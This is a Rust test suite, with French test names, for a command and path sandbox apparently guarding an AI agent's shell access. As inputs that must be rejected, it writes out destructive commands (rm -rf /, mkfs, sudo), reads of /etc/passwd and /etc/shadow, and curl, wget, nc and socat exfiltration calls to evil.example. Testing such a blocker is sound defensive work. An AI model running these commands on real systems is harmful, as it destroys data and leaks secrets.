use super::*;

#[test]
fn validate_path_dans_cwd() {
    let dir = std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    let f = dir.join("sub").join("file.txt");
    std::fs::write(&f, "test").unwrap();
    assert!(validate_path("sub/file.txt", &dir, &[]).is_ok());
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn validate_path_traversal_bloque() {
    let dir = std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(&dir).unwrap();
    let result = validate_path("../../etc/passwd", &dir, &[]);
    assert!(result.is_err());
    assert!(result.unwrap_err().0.contains("périmètre autorisé"));
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn validate_path_absolu_hors_cwd_bloque() {
    let dir = std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(&dir).unwrap();
    assert!(validate_path("/etc/shadow", &dir, &[]).is_err());
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn validate_path_allowed_dir() {
    let dir = std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
    let other = std::env::temp_dir().join(format!("acp-other-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::create_dir_all(&other).unwrap();
    let f = other.join("data.txt");
    std::fs::write(&f, "ok").unwrap();
    assert!(validate_path(f.to_str().unwrap(), &dir, std::slice::from_ref(&other)).is_ok());
    std::fs::remove_dir_all(&dir).ok();
    std::fs::remove_dir_all(&other).ok();
}

#[test]
fn path_starts_with_ok() {
    assert!(super::path::path_starts_with(
        std::path::Path::new("/home/user/project/src/main.rs"),
        std::path::Path::new("/home/user/project")
    ));
}

#[test]
fn path_starts_with_reject_partial() {
    assert!(!super::path::path_starts_with(
        std::path::Path::new("/home/user/projectB/file.rs"),
        std::path::Path::new("/home/user/project")
    ));
}

#[test]
fn sandbox_bloque_rm_rf() {
    assert!(ShellSandbox::new().validate("rm -rf /").is_err());
}

#[test]
fn sandbox_bloque_sudo() {
    assert!(ShellSandbox::new().validate("sudo rm -rf /").is_err());
}

#[test]
fn sandbox_bloque_shutdown() {
    assert!(ShellSandbox::new().validate("shutdown now").is_err());
}

#[test]
fn sandbox_autorise_commandes_connues() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("git status").is_ok());
    assert!(sb.validate("cargo build").is_err());
    assert!(sb.validate("ls -la").is_ok());
    assert!(sb.validate("grep -rn pattern src/").is_ok());
}

#[test]
fn sandbox_permissive_accepte_structurement_dangereux() {
    let sb = ShellSandbox::permissive();
    assert!(sb.validate("rm -rf /").is_ok());
    assert!(sb.validate("sudo anything").is_ok());
    assert!(sb.validate("echo hi && echo bye").is_ok());
}

#[test]
fn sandbox_bloque_mkfs() {
    assert!(ShellSandbox::new().validate("mkfs.ext4 /dev/sda1").is_err());
}

#[test]
fn sandbox_bloque_crontab() {
    assert!(ShellSandbox::new().validate("crontab -e").is_err());
}

#[test]
fn sandbox_autorise_pipes() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("cat file.txt | grep pattern").is_ok());
    assert!(sb.validate("git diff | grep '^+' | head -20").is_ok());
}

#[test]
fn sandbox_rejette_starts_with_bypass() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("gitfoo status").is_err());
    assert!(sb.validate("catabc file").is_err());
    assert!(sb.validate("cargoxy build").is_err());
}

#[test]
fn sandbox_rejette_sh_c() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("sh -c 'rm -rf /'").is_err());
    assert!(sb.validate("bash -c 'echo pwned'").is_err());
    assert!(sb.validate("python -c 'import os; os.system(\"rm -rf /\")'").is_err());
}

#[test]
fn sandbox_rejette_network_exfil() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("curl http://evil.example/exfil").is_err());
    assert!(sb.validate("wget http://evil.example/payload").is_err());
    assert!(sb.validate("nc -l 4444").is_err());
    assert!(sb.validate("socat - TCP:evil.example:4444").is_err());
}

#[test]
fn sandbox_bloque_pipe_vers_sh() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("echo 'rm -rf /' | sh").is_err());
    assert!(sb.validate("cat payload | bash").is_err());
    assert!(sb.validate("find . -name '*.sh' -exec sh -c '{}' \\;").is_err());
}

#[test]
fn sandbox_bloque_pipe_vers_interpreteur() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("echo 'import os' | python").is_err());
    assert!(sb.validate("cat script.pl | perl").is_err());
    assert!(sb.validate("echo payload | python -c 'print(1)'").is_err());
}

#[test]
fn sandbox_bloque_xargs_sh() {
    assert!(ShellSandbox::new().validate("find . | xargs sh").is_err());
}

#[test]
fn sandbox_bloque_eval() {
    assert!(ShellSandbox::new().validate("eval 'rm -rf /'").is_err());
}

#[test]
fn sandbox_bloque_exec() {
    assert!(ShellSandbox::new().validate("exec /bin/sh").is_err());
}

#[test]
fn sandbox_bloque_non_pipe_operators() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("echo hello; git status").is_err());
    assert!(sb.validate("echo hello && git status").is_err());
    assert!(sb.validate("echo hello || git status").is_err());
    assert!(sb.validate("sleep 1 &").is_err());
    assert!(sb.validate("echo hello > output.txt").is_err());
}

#[test]
fn sandbox_bloque_command_substitution() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("echo $(whoami)").is_err());
    assert!(sb.validate("echo `whoami`").is_err());
}

#[test]
fn sandbox_bloque_environment_expansion() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("echo $HOME").is_err());
    assert!(sb.validate("echo '${PATH}'").is_err());
}

#[test]
fn sandbox_bloque_programme_hors_allowlist() {
    assert!(ShellSandbox::new().validate("unknown-command --version").is_err());
    assert!(ShellSandbox::new().validate("/bin/echo hello").is_err());
}

#[test]
fn sandbox_bloque_traversal_command_target() {
    let sb = ShellSandbox::new();
    assert!(sb.validate("rm -rf ../outside").is_err());
    assert!(sb.validate("chmod 777 /tmp/file").is_err());
}

#[test]
fn sandbox_normalize_quotes() {
    let sb = ShellSandbox::new();
    assert_eq!(
        sb.normalize("cat 'file name.txt' | grep \"foo bar\"").unwrap(),
        "cat file name.txt | grep foo bar"
    );
}

#[test]
fn risk_level_ordre_correct() {
    assert!(RiskLevel::Low < RiskLevel::Medium);
    assert!(RiskLevel::Medium < RiskLevel::High);
    assert!(RiskLevel::High < RiskLevel::Critical);
}

#[test]
fn risk_level_display() {
    assert_eq!(RiskLevel::Low.label(), "low");
    assert_eq!(RiskLevel::Critical.label(), "critical");
}

#[test]
fn analysis_commande_simple_low_risk() {
    let analysis = ShellSandbox::new().analyze_command("ls -la").unwrap();
    assert_eq!(analysis.risk, RiskLevel::Low);
    assert!(!analysis.has_pipes);
    assert!(!analysis.has_env_injection);
    assert_eq!(analysis.line_count, 1);
}

#[test]
fn analysis_pipe_medium_risk() {
    let analysis = ShellSandbox::new().analyze_command("cat file.txt | grep pattern").unwrap();
    assert_eq!(analysis.risk, RiskLevel::Medium);
    assert!(analysis.has_pipes);
    assert_eq!(analysis.commands.len(), 2);
}

#[test]
fn analysis_rm_critical_risk() {
    let analysis = ShellAnalysis::analyze("rm -rf ./build");
    assert_eq!(analysis.risk, RiskLevel::Critical);
}

#[test]
fn analysis_dynamic_substitution_is_critical() {
    let analysis = ShellAnalysis::analyze("echo $(cat /etc/passwd)");
    assert!(analysis.has_env_injection);
    assert_eq!(analysis.risk, RiskLevel::Critical);
}

#[test]
fn analysis_backtick_is_critical() {
    let analysis = ShellAnalysis::analyze("echo `whoami`");
    assert!(analysis.has_env_injection);
    assert_eq!(analysis.risk, RiskLevel::Critical);
}

#[test]
fn analysis_multiline_is_critical_for_policy() {
    let analysis = ShellAnalysis::analyze("echo line1\necho line2\necho line3");
    assert_eq!(analysis.risk, RiskLevel::Critical);
    assert_eq!(analysis.line_count, 3);
}

#[test]
fn analysis_summary_format() {
    let analysis = ShellSandbox::new().analyze_command("cat file.txt | grep pattern | sort").unwrap();
    assert!(analysis.summary().contains("medium risk"));
    assert!(analysis.summary().contains("commands in pipe chain"));
}

#[test]
fn risk_docker_high() {
    assert_eq!(ShellAnalysis::analyze("docker build .").risk, RiskLevel::High);
}

#[test]
fn risk_npm_high() {
    assert_eq!(ShellAnalysis::analyze("npm install lodash").risk, RiskLevel::High);
}

#[test]
fn risk_echo_low() {
    assert_eq!(
        ShellSandbox::new().analyze_command("echo hello world").unwrap().risk,
        RiskLevel::Low
    );
}

#[test]
fn risk_compilation_high() {
    assert_eq!(ShellAnalysis::analyze("cargo build --release").risk, RiskLevel::High);
}

#[test]
fn parser_ignores_trailing_comment() {
    let parsed = parse_shell("git status\n# trailing comment\n").unwrap();
    assert_eq!(parsed.segments[0].program, "git");
    assert!(parsed.operators.is_empty());
}
